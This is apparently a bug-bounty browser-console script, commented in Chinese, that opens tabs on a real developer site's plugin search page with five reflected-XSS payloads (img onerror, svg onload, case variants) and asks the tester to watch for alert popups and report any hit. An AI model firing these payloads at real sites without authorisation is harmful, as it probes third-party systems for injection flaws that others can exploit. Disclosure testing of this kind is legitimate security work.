// XSS浏览器验证脚本
// 使用方法：复制到浏览器Console执行

console.log("=".repeat(80));
console.log("🎯 XSS浏览器验证");
console.log("=".repeat(80));

const baseUrl = 'https://developer.konghq.com';

// 测试payloads
const payloads = [
    '<img src=x>',
    '<img src=x oNError=alert("XSS!")>',
    '<img src=x onerror=alert("XSS!")>',
    '<svg onload=alert("XSS!")>',
    '<IMG SRC=x ONERROR=alert("XSS!")>',
];

async function testPayload(payload) {
    console.log(`\n[测试] ${payload}`);
    
    const url = `${baseUrl}/plugins/?q=${encodeURIComponent(payload)}`;
    console.log(`URL: ${url}`);
    
    // 在新标签页打开
    const newWindow = window.open(url, '_blank');
    
    // 等待页面加载
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    console.log(`✅ 已打开新标签页，请检查是否弹出alert`);
    console.log(`   如果看到alert对话框，说明XSS可利用！`);
    
    return newWindow;
}

async function runAllTests() {
    console.log("\n开始测试...\n");
    console.log("⚠️  每个payload会打开一个新标签页");
    console.log("⚠️  请观察是否有alert弹窗\n");
    
    for (let i = 0; i < payloads.length; i++) {
        console.log(`\n--- 测试 ${i + 1}/${payloads.length} ---`);
        await testPayload(payloads[i]);
        
        // 等待用户确认
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
    
    console.log("\n" + "=".repeat(80));
    console.log("📊 测试完成");
    console.log("=".repeat(80));
    console.log("\n如果任何一个payload触发了alert，说明发现了XSS漏洞！");
    console.log("请立即截图保存证据并提交漏洞报告。");
}

// 执行测试
runAllTests();
